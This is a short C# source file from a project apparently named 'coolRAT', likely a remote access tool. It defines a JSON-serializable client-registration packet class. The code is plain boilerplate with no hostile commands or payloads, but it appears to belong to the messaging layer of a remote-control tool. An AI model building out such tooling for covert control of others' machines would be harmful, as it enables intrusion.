using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class CAP_RegisterClientPacket : Packet
    {
        public CAP_RegisterClientPacket() : base(Guid.Empty)
        {
            Type = "CAP_RegisterClientPacket";
        }

        public new string Serialize()
        {
            return JsonConvert.SerializeObject(this);
        }

        public new static CAP_RegisterClientPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<CAP_RegisterClientPacket>(packet_string);
        }
    }
}
